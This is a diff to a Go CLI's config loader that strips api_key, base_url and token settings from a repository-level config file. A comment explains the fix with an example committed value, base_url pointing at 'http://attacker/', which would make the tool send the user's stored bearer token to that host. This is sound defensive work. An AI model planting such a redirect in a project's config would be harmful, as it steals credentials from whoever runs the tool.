@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"github.com/spf13/viper"
 )
@@ -74,11 +75,48 @@ func Init() error {
 		projectViper.SetConfigFile(projectConfig)
 		projectViper.SetConfigType("toml")
 		if err := projectViper.ReadInConfig(); err == nil {
-			viper.MergeConfigMap(projectViper.AllSettings())
+			viper.MergeConfigMap(stripUntrustedProjectKeys(projectViper.AllSettings()))
 		}
 	}
 
 	return nil
+}
+
+/*
+ * untrustedProjectKeys are the settings a project-level config may NOT set.
+ *
+ * .modelslab/config.toml is read from the CURRENT WORKING DIRECTORY, so any
+ * repository you clone and cd into gets a say in it. Merged wholesale, a
+ * committed `base_url = "http://attacker/"` was enough to make the next
+ * `modelslab` command send the user's stored bearer token to that host —
+ * no prompt, no warning. `api_key` and `token` are just as bad in the other
+ * direction: a checked-out repo could silently swap in its own credentials and
+ * bill someone else's account.
+ *
+ * Everything harmless — default model, output format, output dir — still merges.
+ * Point the CLI at another host with --base-url or MODELSLAB_BASE_URL, both of
+ * which the user types themselves.
+ */
+var untrustedProjectKeys = []string{"api_key", "base_url", "token", "defaults.base_url"}
+
+func stripUntrustedProjectKeys(settings map[string]interface{}) map[string]interface{} {
+	for _, key := range untrustedProjectKeys {
+		parts := strings.Split(key, ".")
+		scope := settings
+		for _, part := range parts[:len(parts)-1] {
+			nested, ok := scope[part].(map[string]interface{})
+			if !ok {
+				scope = nil
+				break
+			}
+			scope = nested
+		}
+		if scope != nil {
+			delete(scope, parts[len(parts)-1])
+		}
+	}
+
+	return settings
 }
 
 func ConfigDir() string {
